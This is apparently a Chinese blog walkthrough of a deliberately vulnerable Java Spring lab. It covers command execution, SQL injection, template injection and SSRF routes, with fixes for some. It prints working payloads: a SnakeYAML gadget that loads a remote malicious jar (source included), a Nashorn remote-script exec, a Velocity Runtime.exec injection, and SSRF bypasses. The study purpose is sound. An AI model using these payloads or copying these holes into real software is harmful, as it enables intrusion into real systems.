<h3 id="2-路由-x2F-rce-x2F-ProcessBuilder"><a href="#2-路由-x2F-rce-x2F-ProcessBuilder" class="headerlink" title="2.路由&#x2F;rce&#x2F;ProcessBuilder"></a>2.路由&#x2F;rce&#x2F;ProcessBuilder</h3><p>漏洞代码：</p>
<pre><code class="Java">@GetMapping(&quot;/ProcessBuilder&quot;)
    public String processBuilder(String cmd) &#123;

        StringBuilder sb = new StringBuilder();

        try &#123;
            String[] arrCmd = &#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;;
            ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) &#123;
                sb.append(tmpStr);
            &#125;
        &#125; catch (Exception e) &#123;
            return e.toString();
        &#125;

        return sb.toString();
    &#125;
</code></pre>
<p>该代码通过GET请求接收一个cmd参数，利用ProcessBuilder类调用操作系统进程进行命令执行。这里需要注意的是，在windows系统中要这么写：</p>
<pre><code class="Java">String[] arrCmd = &#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125;;
</code></pre>
<p>利用过程：</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240927151028420.png" alt="image-20240927151028420"></p>
<h3 id="3-路由-x2F-rce-x2F-jscmd"><a href="#3-路由-x2F-rce-x2F-jscmd" class="headerlink" title="3.路由&#x2F;rce&#x2F;jscmd"></a>3.路由&#x2F;rce&#x2F;jscmd</h3><p>漏洞代码：</p>
<pre><code class="java">@GetMapping(&quot;/jscmd&quot;)
    public void jsEngine(String jsurl) throws Exception&#123;
        // js nashorn javascript ecmascript
        ScriptEngine engine = new ScriptEngineManager().getEngineByName(&quot;js&quot;);
        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
        String cmd = String.format(&quot;load(\&quot;%s\&quot;)&quot;, jsurl);
        engine.eval(cmd, bindings);
    &#125;
</code></pre>
<p>该代码通过远程加载一个js脚本代码，然后通过ScriptEngine类解析执行，我们的js脚本代码如下：</p>
<pre><code class="js">var a = mainOutput(); function mainOutput() &#123; var x=java.lang.Runtime.getRuntime().exec(&quot;calc.exe&quot;);
</code></pre>
<p>由于该命令执行无回显，我们通过调用计算器的方式证明命令成功执行：</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240927152514570.png" alt="image-20240927152514570"></p>
<h3 id="4-路由-x2F-rce-x2F-vuln-x2F-yarm"><a href="#4-路由-x2F-rce-x2F-vuln-x2F-yarm" class="headerlink" title="4.路由&#x2F;rce&#x2F;vuln&#x2F;yarm"></a>4.路由&#x2F;rce&#x2F;vuln&#x2F;yarm</h3><p>漏洞代码：</p>
<pre><code class="Java"> @GetMapping(&quot;/vuln/yarm&quot;)
    public void yarm(String content) &#123;
        Yaml y = new Yaml();
        y.load(content);
    &#125;
</code></pre>
<p>该代码利用SnakeYAML存在的反序列化漏洞来rce，在解析恶意 yml 内容时会完成指定的动作，实现命令执行。我们所加载的yaml文件如下：</p>
<pre><code class="yaml">!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL [&quot;http://127.0.0.1/yaml-payload.jar&quot;]
  ]]
]
</code></pre>
<p>jar是我们远程加载的恶意文件，其源码如下：</p>
<pre><code class="java">package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory &#123;

    public AwesomeScriptEngineFactory() &#123;
        try &#123;
            Runtime.getRuntime().exec(&quot;whoami&quot;);
            Runtime.getRuntime().exec(&quot;calc.exe&quot;);
        &#125; catch (IOException e) &#123;
            e.printStackTrace();
        &#125;
    &#125;

    @Override
    public String getEngineName() &#123;
        return null;
    &#125;

    @Override
    public String getEngineVersion() &#123;
        return null;
    &#125;

    @Override
    public List&lt;String&gt; getExtensions() &#123;
        return null;
    &#125;

    @Override
    public List&lt;String&gt; getMimeTypes() &#123;
        return null;
    &#125;

    @Override
    public List&lt;String&gt; getNames() &#123;
        return null;
    &#125;

    @Override
    public String getLanguageName() &#123;
        return null;
    &#125;

    @Override
    public String getLanguageVersion() &#123;
        return null;
    &#125;

    @Override
    public Object getParameter(String key) &#123;
        return null;
    &#125;

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) &#123;
        return null;
    &#125;

    @Override
    public String getOutputStatement(String toDisplay) &#123;
        return null;
    &#125;

    @Override
    public String getProgram(String... statements) &#123;
        return null;
    &#125;

    @Override
    public ScriptEngine getScriptEngine() &#123;
        return null;
    &#125;
&#125;
</code></pre>
<p>因为是使用了ScriptEngineFactory接口，该接口中存在抽象方法所以要对一些抽象方法进行重构。使用下面命令打包生成jar文件</p>
<pre><code>javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
</code></pre>
<p>payload链接：<a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p>
<p>漏洞验证：</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240927162828252.png" alt="image-20240927162828252"></p>
<p>漏洞修复：</p>
<pre><code class="java">Yaml y = new Yaml(new SafeConstructor());
</code></pre>
<h3 id="5-路由-x2F-rce-x2F-groovy"><a href="#5-路由-x2F-rce-x2F-groovy" class="headerlink" title="5.路由&#x2F;rce&#x2F;groovy"></a>5.路由&#x2F;rce&#x2F;groovy</h3><p>漏洞代码：</p>
<pre><code class="Java">@GetMapping(&quot;groovy&quot;)
public void groovyshell(String content) &#123;
    GroovyShell groovyShell = new GroovyShell();
    groovyShell.evaluate(content);
&#125;
</code></pre>
<p>利用groovy进行命令执行，漏洞利用如下：</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240927163939476.png" alt="image-20240927163939476"></p>
<h2 id="二、SQL注入"><a href="#二、SQL注入" class="headerlink" title="二、SQL注入"></a>二、SQL注入</h2><h3 id="1-路由-x2F-sqli-x2F-jdbc-x2F-vuln"><a href="#1-路由-x2F-sqli-x2F-jdbc-x2F-vuln" class="headerlink" title="1.路由&#x2F;sqli&#x2F;jdbc&#x2F;vuln"></a>1.路由&#x2F;sqli&#x2F;jdbc&#x2F;vuln</h3><p>漏洞代码：</p>
<pre><code class="java">@RequestMapping(&quot;/jdbc/vuln&quot;)
    public String jdbc_sqli_vul(@RequestParam(&quot;username&quot;) String username) &#123;

        StringBuilder result = new StringBuilder();

        try &#123;
            Class.forName(driver);
            Connection con = DriverManager.getConnection(url, user, password);

            if (!con.isClosed())
                System.out.println(&quot;Connect to database successfully.&quot;);

            // sqli vuln code
            Statement statement = con.createStatement();
            String sql = &quot;select * from users where username = &#39;&quot; + username + &quot;&#39;&quot;;
            logger.info(sql);
            ResultSet rs = statement.executeQuery(sql);

            while (rs.next()) &#123;
                String res_name = rs.getString(&quot;username&quot;);
                String res_pwd = rs.getString(&quot;password&quot;);
                String info = String.format(&quot;%s: %s\n&quot;, res_name, res_pwd);
                result.append(info);
                logger.info(info);
            &#125;
            rs.close();
            con.close();


        &#125; catch (ClassNotFoundException e) &#123;
            logger.error(&quot;Sorry, can&#39;t find the Driver!&quot;);
        &#125; catch (SQLException e) &#123;
            logger.error(e.toString());
        &#125;
        return result.toString();
    &#125;
</code></pre>
<p>漏洞成因代码：</p>
<pre><code>String sql = &quot;select * from users where username = &#39;&quot; + username + &quot;&#39;&quot;;
</code></pre>
<p>GET接收到的参数直接与SQL语句进行拼接，可以通过闭合引号实现绕过，验证如下：</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240927165141332.png" alt="image-20240927165141332"></p>
<h3 id="2-路由-x2F-sqli-x2F-jdbc-x2F-ps-x2F-vuln"><a href="#2-路由-x2F-sqli-x2F-jdbc-x2F-ps-x2F-vuln" class="headerlink" title="2.路由&#x2F;sqli&#x2F;jdbc&#x2F;ps&#x2F;vuln"></a>2.路由&#x2F;sqli&#x2F;jdbc&#x2F;ps&#x2F;vuln</h3><p>漏洞代码：</p>
<pre><code class="java">@RequestMapping(&quot;/jdbc/ps/vuln&quot;)
public String jdbc_ps_vuln(@RequestParam(&quot;username&quot;) String username) &#123;

    StringBuilder result = new StringBuilder();
    try &#123;
        Class.forName(driver);
        Connection con = DriverManager.getConnection(url, user, password);

        if (!con.isClosed())
            System.out.println(&quot;Connecting to Database successfully.&quot;);

        String sql = &quot;select * from users where username = &#39;&quot; + username + &quot;&#39;&quot;;
        PreparedStatement st = con.prepareStatement(sql);

        logger.info(st.toString());
        ResultSet rs = st.executeQuery();

        while (rs.next()) &#123;
            String res_name = rs.getString(&quot;username&quot;);
            String res_pwd = rs.getString(&quot;password&quot;);
            String info = String.format(&quot;%s: %s\n&quot;, res_name, res_pwd);
            result.append(info);
            logger.info(info);
        &#125;

        rs.close();
        con.close();

    &#125; catch (ClassNotFoundException e) &#123;
        logger.error(&quot;Sorry, can&#39;t find the Driver!&quot;);
        e.printStackTrace();
    &#125; catch (SQLException e) &#123;
        logger.error(e.toString());
    &#125;
    return result.toString();
&#125;
</code></pre>
<p>漏洞成因代码：</p>
<pre><code> String sql = &quot;select * from users where username = &#39;&quot; + username + &quot;&#39;&quot;;
            PreparedStatement st = con.prepareStatement(sql);
</code></pre>
<p>这里虽然使用了prepareStatement进行预编译处理，可是sql语句在进入prepareStatement之前就已经和GET接收的参数进行拼接，因此仍不起到防护作用，复现过程同上。</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240927170714658.png" alt="image-20240927170714658"></p>
<h3 id="3-路由-x2F-sqli-x2F-mybatis-x2F-vuln01"><a href="#3-路由-x2F-sqli-x2F-mybatis-x2F-vuln01" class="headerlink" title="3.路由&#x2F;sqli&#x2F;mybatis&#x2F;vuln01"></a>3.路由&#x2F;sqli&#x2F;mybatis&#x2F;vuln01</h3><p>漏洞代码：</p>
<pre><code class="Java">public List&lt;User&gt; mybatisVuln01(@RequestParam(&quot;username&quot;) String username) &#123;
        return userMapper.findByUserNameVuln01(username);
    &#125;
</code></pre>
<p>再来看函数<code>findByUserNameVuln01</code>定义：</p>
<pre><code class="java">@Select(&quot;select * from users where username = &#39;$&#123;username&#125;&#39;&quot;)
    List&lt;User&gt; findByUserNameVuln01(@Param(&quot;username&quot;) String username);
</code></pre>
<p>该代码使用 MyBatis框架，用来指定 SQL 查询语句。**<code>$&#123;username&#125;</code>**：在这里，<code>username</code> 是直接拼接到 SQL 查询中的。这意味着输入的内容会直接插入到 SQL 语句中，而不会进行任何预处理或转义。因此我们仍然可以用上面的方法进行SQL注入。</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240927171602990.png" alt="image-20240927171602990"></p>
<p>修复代码：</p>
<pre><code>@Select(&quot;select * from users where username = #&#123;username&#125;&quot;)
</code></pre>
<h3 id="3-路由-x2F-sqli-x2F-mybatis-x2F-vuln02"><a href="#3-路由-x2F-sqli-x2F-mybatis-x2F-vuln02" class="headerlink" title="3.路由&#x2F;sqli&#x2F;mybatis&#x2F;vuln02"></a>3.路由&#x2F;sqli&#x2F;mybatis&#x2F;vuln02</h3><p>漏洞代码：</p>
<pre><code class="java"> @GetMapping(&quot;/mybatis/vuln02&quot;)
    public List&lt;User&gt; mybatisVuln02(@RequestParam(&quot;username&quot;) String username) &#123;
        return userMapper.findByUserNameVuln02(username);
    &#125;
</code></pre>
<p>再来看函数<code>findByUserNameVuln02</code>定义</p>
<pre><code class="Java">List&lt;User&gt; findByUserNameVuln02(String username);
</code></pre>
<p>去掉了映射关系，不影响漏洞存在，仍可用原payload：</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240927172317279.png" alt="image-20240927172317279"></p>
<h3 id="4-路由-x2F-mybatis-x2F-orderby-x2F-vuln03"><a href="#4-路由-x2F-mybatis-x2F-orderby-x2F-vuln03" class="headerlink" title="4.路由&#x2F;mybatis&#x2F;orderby&#x2F;vuln03"></a>4.路由&#x2F;mybatis&#x2F;orderby&#x2F;vuln03</h3><p>漏洞代码：</p>
<pre><code class="java"> @GetMapping(&quot;/mybatis/orderby/vuln03&quot;)
    public List&lt;User&gt; mybatisVuln03(@RequestParam(&quot;sort&quot;) String sort) &#123;
        return userMapper.findByUserNameVuln03(sort);
    &#125;
</code></pre>
<p>再来看函数<code>findByUserNameVuln03</code>定义</p>
<pre><code class="java">List&lt;User&gt; findByUserNameVuln03(@Param(&quot;order&quot;) String order);
</code></pre>
<p>使用MyBatis框架中的order字段，换用下面方法进行注入：</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240927174250625.png" alt="image-20240927174250625"></p>
<h3 id="sql注入修复与防护"><a href="#sql注入修复与防护" class="headerlink" title="sql注入修复与防护"></a>sql注入修复与防护</h3><h4 id="（1）预编译"><a href="#（1）预编译" class="headerlink" title="（1）预编译"></a>（1）预编译</h4><pre><code>String sql = &quot;select * from users where username = ?&quot;;
PreparedStatement st = con.prepareStatement(sql);
</code></pre>
<h4 id="（2）waf"><a href="#（2）waf" class="headerlink" title="（2）waf"></a>（2）waf</h4><pre><code class="java"> private static final Pattern FILTER_PATTERN = Pattern.compile(&quot;^[a-zA-Z0-9_/\\.-]+$&quot;);
 public static String sqlFilter(String sql) &#123;
        if (!FILTER_PATTERN.matcher(sql).matches()) &#123;
            return null;
        &#125;
        return sql;
    
</code></pre>
<h4 id="（3）MyBatis防护"><a href="#（3）MyBatis防护" class="headerlink" title="（3）MyBatis防护"></a>（3）MyBatis防护</h4><pre><code>@Select(&quot;select * from users where username = #&#123;username&#125;&quot;)
</code></pre>
<h2 id="三、SSTI"><a href="#三、SSTI" class="headerlink" title="三、SSTI"></a>三、SSTI</h2><h3 id="1-路由-x2F-ssti-x2F-velocity"><a href="#1-路由-x2F-ssti-x2F-velocity" class="headerlink" title="1.路由&#x2F;ssti&#x2F;velocity"></a>1.路由&#x2F;ssti&#x2F;velocity</h3><p>漏洞代码：</p>
<pre><code class="java">  @GetMapping(&quot;/velocity&quot;)
    public void velocity(String template) &#123;
        Velocity.init();

        VelocityContext context = new VelocityContext();

        context.put(&quot;author&quot;, &quot;Elliot A.&quot;);
        context.put(&quot;address&quot;, &quot;217 E Broadway&quot;);
        context.put(&quot;phone&quot;, &quot;555-1337&quot;);

        StringWriter swOut = new StringWriter();
        Velocity.evaluate(context, swOut, &quot;test&quot;, template);
    &#125;
&#125;
</code></pre>
<p>Apache Velocity是一个基于模板的引擎，用于生成文本输出(例如：HTML、XML或任何其他形式的ASCII文本)，它的设计目标是提供一种简单且灵活的方式来将模板和上下文数据结合在一起，因此被广泛应用于各种Java应用程序中包括Web应用。具体Apache Velocity引擎的应用可以看<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/716756926">这篇博客</a>。</p>
<p><strong>Velocity.evaluate</strong></p>
<p>Velocity.evaluate是Velocity引擎中的一个方法，用于处理字符串模板的评估，Velocity是一个基于Java的模板引擎，广泛应用于WEB开发和其他需要动态内容生成的场合，Velocity.evaluate方法的主要作用是将给定的模板字符串与上下文对象结合并生成最终的输出结果，这个方法通常用于在运行时动态创建内容，比如：生成HTML页面的内容或电子邮件的文本，方法如下所示：</p>
<pre><code class="text">public static void evaluate(Context context, Writer writer, String templateName, String template)
</code></pre>
<p>参数说明：</p>
<ul>
<li>Context context：提供模板所需的数据上下文，可以包含多个键值对</li>
<li>Writer writer：输出流，用于写入生成的内容</li>
<li>String templateName：模板的名称，通常用于调试信息中</li>
<li>String template：要评估的模板字符串</li>
</ul>
<p>我们可以构造如下payload：</p>
<pre><code class="java">#set($e=&quot;e&quot;);$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc&quot;)
</code></pre>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930110431275.png" alt="image-20240930110431275"></p>
<p>成功模板注入。</p>
<h2 id="四、SSRF"><a href="#四、SSRF" class="headerlink" title="四、SSRF"></a>四、SSRF</h2><h3 id="1-路由-x2F-ssrf-x2F-urlConnection-x2F-vuln"><a href="#1-路由-x2F-ssrf-x2F-urlConnection-x2F-vuln" class="headerlink" title="1.路由&#x2F;ssrf&#x2F;urlConnection&#x2F;vuln"></a>1.路由&#x2F;ssrf&#x2F;urlConnection&#x2F;vuln</h3><p>漏洞代码：</p>
<pre><code class="java">    @RequestMapping(value = &quot;/urlConnection/vuln&quot;, method = &#123;RequestMethod.POST, RequestMethod.GET&#125;)
    public String URLConnectionVuln(String url) &#123;
        return HttpUtils.URLConnection(url);
    &#125;
</code></pre>
<p>再来看函数<code>UrlConnection</code>的定义：</p>
<pre><code class="java">   public static String URLConnection(String url) &#123;
        try &#123;
            URL u = new URL(url);
            URLConnection urlConnection = u.openConnection();
            BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream())); //send request
            String inputLine;
            StringBuilder html = new StringBuilder();

            while ((inputLine = in.readLine()) != null) &#123;
                html.append(inputLine);
            &#125;
            in.close();
            return html.toString();
        &#125; catch (Exception e) &#123;
            logger.error(e.getMessage());
            return e.getMessage();
        &#125;
    &#125;
</code></pre>
<p>这里我们可以用文件读取协议<code>file:/</code>实现访问，也可以访问到内网的其他主机</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930115111649.png" alt="image-20240930115111649"></p>
<h3 id="2-路由-x2F-ssrf-x2F-HttpURLConnection-x2F-vuln"><a href="#2-路由-x2F-ssrf-x2F-HttpURLConnection-x2F-vuln" class="headerlink" title="2.路由&#x2F;ssrf&#x2F;HttpURLConnection&#x2F;vuln"></a>2.路由&#x2F;ssrf&#x2F;HttpURLConnection&#x2F;vuln</h3><p>漏洞代码：</p>
<pre><code class="java">@GetMapping(&quot;/HttpURLConnection/vuln&quot;)
public String httpURLConnectionVuln(@RequestParam String url) &#123;
    return HttpUtils.HttpURLConnection(url);
&#125;
</code></pre>
<p>来看函数<code>HttpUrlConnection</code>定义：</p>
<pre><code class="java">    public static String HttpURLConnection(String url) &#123;
        try &#123;
            URL u = new URL(url);
            URLConnection urlConnection = u.openConnection();
            HttpURLConnection conn = (HttpURLConnection) urlConnection;
//             conn.setInstanceFollowRedirects(false);
//             Many HttpURLConnection methods can send http request, such as getResponseCode, getHeaderField
            InputStream is = conn.getInputStream();  // send request
            BufferedReader in = new BufferedReader(new InputStreamReader(is));
            String inputLine;
            StringBuilder html = new StringBuilder();

            while ((inputLine = in.readLine()) != null) &#123;
                html.append(inputLine);
            &#125;
            in.close();
            return html.toString();
        &#125; catch (IOException e) &#123;
            logger.error(e.getMessage());
            return e.getMessage();
        &#125;
    &#125;
</code></pre>
<p>这里用<code>HttpURLConnection</code>类进行了一个强转，限制只能使用http&#x2F;https协议，但可以访问内网其他主机：</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930143648191.png" alt="image-20240930143648191"></p>
<h3 id="3-路由-x2F-ssrf-x2F-openStream"><a href="#3-路由-x2F-ssrf-x2F-openStream" class="headerlink" title="3.路由&#x2F;ssrf&#x2F;openStream"></a>3.路由&#x2F;ssrf&#x2F;openStream</h3><pre><code class="java">    @GetMapping(&quot;/openStream&quot;)
    public void openStream(@RequestParam String url, HttpServletResponse response) throws IOException &#123;
        InputStream inputStream = null;
        OutputStream outputStream = null;
        try &#123;
            String downLoadImgFileName = WebUtils.getNameWithoutExtension(url) + &quot;.&quot; + WebUtils.getFileExtension(url);
            // download
            response.setHeader(&quot;content-disposition&quot;, &quot;attachment;fileName=&quot; + downLoadImgFileName);

            URL u = new URL(url);
            int length;
            byte[] bytes = new byte[1024];
            inputStream = u.openStream(); // send request
            outputStream = response.getOutputStream();
            while ((length = inputStream.read(bytes)) &gt; 0) &#123;
                outputStream.write(bytes, 0, length);
            &#125;

        &#125; catch (Exception e) &#123;
            logger.error(e.toString());
        &#125; finally &#123;
            if (inputStream != null) &#123;
                inputStream.close();
            &#125;
            if (outputStream != null) &#123;
                outputStream.close();
            &#125;
        &#125;
    &#125;
</code></pre>
<p>可以通过这个路由实现任意文件下载：</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930145400529.png" alt="image-20240930145400529"></p>
<h3 id="4-路由-x2F-ssrf-x2F-HttpSyncClients-x2F-vuln"><a href="#4-路由-x2F-ssrf-x2F-HttpSyncClients-x2F-vuln" class="headerlink" title="4.路由&#x2F;ssrf&#x2F;HttpSyncClients&#x2F;vuln"></a>4.路由&#x2F;ssrf&#x2F;HttpSyncClients&#x2F;vuln</h3><p>漏洞代码：</p>
<pre><code class="java">    @GetMapping(&quot;/HttpSyncClients/vuln&quot;)
    public String HttpSyncClients(@RequestParam(&quot;url&quot;) String url) &#123;
        return HttpUtils.HttpAsyncClients(url);
    &#125;
</code></pre>
<p><code>HttpAsyncClients</code>函数：</p>
<pre><code class="java"> public static String HttpAsyncClients(String url) &#123;
        CloseableHttpAsyncClient httpclient = HttpAsyncClients.createDefault();
        try &#123;
            httpclient.start();
            final HttpGet request = new HttpGet(url);
            Future&lt;HttpResponse&gt; future = httpclient.execute(request, null);
            HttpResponse response = future.get(6000, TimeUnit.MILLISECONDS);
            return EntityUtils.toString(response.getEntity());
        &#125; catch (Exception e) &#123;
            return e.getMessage();
        &#125; finally &#123;
            try &#123;
                httpclient.close();
            &#125; catch (Exception e) &#123;
                logger.error(e.getMessage());
            &#125;
        &#125;
    &#125;
</code></pre>
<p>未对SSRF进行检查，存在漏洞：</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930160113322.png" alt="image-20240930160113322"></p>
<h3 id="5-路由-x2F-ssrf-x2F-restTemplate-x2F-vuln1"><a href="#5-路由-x2F-ssrf-x2F-restTemplate-x2F-vuln1" class="headerlink" title="5.路由&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln1"></a>5.路由&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln1</h3><p>漏洞代码：</p>
<pre><code class="java"> @GetMapping(&quot;/restTemplate/vuln1&quot;)
    public String RestTemplateUrlBanRedirects(String url)&#123;
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_JSON_UTF8);
        return httpService.RequestHttpBanRedirects(url, headers);
    &#125;
</code></pre>
<p>这段代码使用 <strong>Spring RestTemplate</strong> 来进行 HTTP 请求，并禁止了重定向，但不影响直接访问：</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930161505278.png" alt="image-20240930161505278"></p>
<h3 id="6-路由-x2F-ssrf-x2F-restTemplate-x2F-vuln2"><a href="#6-路由-x2F-ssrf-x2F-restTemplate-x2F-vuln2" class="headerlink" title="6.路由&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln2"></a>6.路由&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln2</h3><p>漏洞代码：</p>
<pre><code class="Java">   @GetMapping(&quot;/restTemplate/vuln2&quot;)
    public String RestTemplateUrl(String url)&#123;
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_JSON_UTF8);
        return httpService.RequestHttp(url, headers);
    &#125;
</code></pre>
<p>这个不禁止重定向了，直接就可以SSRF</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930162139227.png" alt="image-20240930162139227"></p>
<h3 id="7-路由-x2F-ssrf-x2F-hutool-x2F-vuln"><a href="#7-路由-x2F-ssrf-x2F-hutool-x2F-vuln" class="headerlink" title="7.路由&#x2F;ssrf&#x2F;hutool&#x2F;vuln"></a>7.路由&#x2F;ssrf&#x2F;hutool&#x2F;vuln</h3><p>漏洞代码：</p>
<pre><code class="java">@GetMapping(&quot;/hutool/vuln&quot;)
public String hutoolHttp(String url)&#123;
    return HttpUtil.get(url);
&#125;
</code></pre>
<p>换汤不换药，该库也能SSRF,不过禁止了重定向：</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930162620184.png" alt="image-20240930162620184"></p>
<h3 id="8-路由-x2F-ssrf-x2F-denrebind-x2F-vuln"><a href="#8-路由-x2F-ssrf-x2F-denrebind-x2F-vuln" class="headerlink" title="8.路由&#x2F;ssrf&#x2F;denrebind&#x2F;vuln"></a>8.路由&#x2F;ssrf&#x2F;denrebind&#x2F;vuln</h3><p>漏洞代码：</p>
<pre><code>@GetMapping(&quot;/dnsrebind/vuln&quot;)
public String DnsRebind(String url) &#123;
    java.security.Security.setProperty(&quot;networkaddress.cache.negative.ttl&quot; , &quot;0&quot;);
    if (!SecurityUtil.checkSSRFWithoutRedirect(url)) &#123;
        return &quot;Dangerous url&quot;;
    &#125;
    return HttpUtil.get(url);
&#125;
</code></pre>
<p><code>checkSSRFWithoutRedirect</code>函数：</p>
<pre><code class="Java"> /**
     * 不能使用白名单的情况下建议使用该方案。前提是禁用重定向并且TTL默认不为0。
     * 存在问题：
     *  1、TTL为0会被绕过
     *  2、使用重定向可绕过
     *
     * @param url The url that needs to check.
     * @return Safe url returns true. Dangerous url returns false.
     */
    public static boolean checkSSRFWithoutRedirect(String url) &#123;
        if(url == null) &#123;
            return false;
        &#125;
        return !SSRFChecker.isInternalIpByUrl(url);
    &#125;
</code></pre>
<p><code>isInternalIpByUrl</code>函数：</p>
<pre><code class="java">public static boolean isInternalIpByUrl(String url) &#123;

        String host = url2host(url);
        if (host.equals(&quot;&quot;)) &#123;
            return true; // 异常URL当成内网IP等非法URL处理
        &#125;

        String ip = host2ip(host);
        if (ip.equals(&quot;&quot;)) &#123;
            return true; // 如果域名转换为IP异常，则认为是非法URL
        &#125;

        return isInternalIp(ip);
    &#125;
</code></pre>
<p>添加了IP检查，修改一下dns解析即可绕过，方法如下：</p>
<p>给本地的hosts文件添加一条解析记录：</p>
<pre><code>192.168.1.43 www.baidu.com
</code></pre>
<p>然后就可以实现ssrf：</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930165613203.png" alt="image-20240930165613203"></p>
<h3 id="SSRF修复与防护"><a href="#SSRF修复与防护" class="headerlink" title="SSRF修复与防护"></a>SSRF修复与防护</h3><h4 id="（1）限制协议使用"><a href="#（1）限制协议使用" class="headerlink" title="（1）限制协议使用"></a>（1）限制协议使用</h4><p>修复代码：</p>
<pre><code class="Java">@GetMapping(&quot;/urlConnection/sec&quot;)
    public String URLConnectionSec(String url) &#123;

        // Decline not http/https protocol
        if (!SecurityUtil.isHttp(url)) &#123;
            return &quot;[-] SSRF check failed&quot;;
        &#125;

        try &#123;
            SecurityUtil.startSSRFHook();
            return HttpUtils.URLConnection(url);
        &#125; catch (SSRFException | IOException e) &#123;
            return e.getMessage();
        &#125; finally &#123;
            SecurityUtil.stopSSRFHook();
        &#125;

    &#125;
</code></pre>
<p>isHttp函数定义：</p>
<pre><code class="java"> public static boolean isHttp(String url) &#123;
        return url.startsWith(&quot;http://&quot;) || url.startsWith(&quot;https://&quot;);
    &#125;
</code></pre>
<p>禁用掉了除http&#x2F;https以外的协议，添加了SSRF检查。</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240930142358450.png" alt="image-20240930142358450"></p>
<h4 id="（2）限制文件类型"><a href="#（2）限制文件类型" class="headerlink" title="（2）限制文件类型"></a>（2）限制文件类型</h4><p>修复代码：</p>
<pre><code class="java">   @GetMapping(&quot;/ImageIO/sec&quot;)
    public String ImageIO(@RequestParam String url) &#123;
        try &#123;
            SecurityUtil.startSSRFHook();
            HttpUtils.imageIO(url);
        &#125; catch (SSRFException | IOException e) &#123;
            return e.getMessage();
        &#125; finally &#123;
            SecurityUtil.stopSSRFHook();
        &#125;

        return &quot;ImageIO ssrf test&quot;;
    &#125;
</code></pre>
<p><code>imageIO</code>函数：</p>
<pre><code class="Java">public static void imageIO(String url) &#123;
        try &#123;
            URL u = new URL(url);
            ImageIO.read(u); // send request
        &#125; catch (IOException e) &#123;
            logger.error(e.getMessage());
        &#125;

    &#125;
</code></pre>
<p>使用 <code>Spring</code> 框架的控制器方法，用于进行一个 URL 请求，并通过调用 <code>ImageIO</code> 处理该 URL 指定的图片。同时，它还利用了某种安全机制来防止 SSRF（服务器端请求伪造）攻击。</p>
<h4 id="（3）http请求检查"><a href="#（3）http请求检查" class="headerlink" title="（3）http请求检查"></a>（3）http请求检查</h4><h5 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h5><pre><code class="java">    @GetMapping(&quot;/okhttp/sec&quot;)
    public String okhttp(@RequestParam String url) &#123;

        try &#123;
            SecurityUtil.startSSRFHook();
            return HttpUtils.okhttp(url);
        &#125; catch (SSRFException | IOException e) &#123;
            return e.getMessage();
        &#125; finally &#123;
            SecurityUtil.stopSSRFHook();
        &#125;

    &#125;
</code></pre>
<p><code>okhttp</code>函数：</p>
<pre><code class="java">public static String okhttp(String url) throws IOException &#123;
    OkHttpClient client = new OkHttpClient();
    com.squareup.okhttp.Request ok_http = new com.squareup.okhttp.Request.Builder().url(url).build();
    return client.newCall(ok_http).execute().body().string();
&#125;
</code></pre>
<h5 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h5><pre><code class="java"> @GetMapping(&quot;/httpclient/sec&quot;)
    public String HttpClient(@RequestParam String url) &#123;

        try &#123;
            SecurityUtil.startSSRFHook();
            return HttpUtils.httpClient(url);
        &#125; catch (SSRFException | IOException e) &#123;
            return e.getMessage();
        &#125; finally &#123;
            SecurityUtil.stopSSRFHook();
        &#125;

    &#125;
</code></pre>
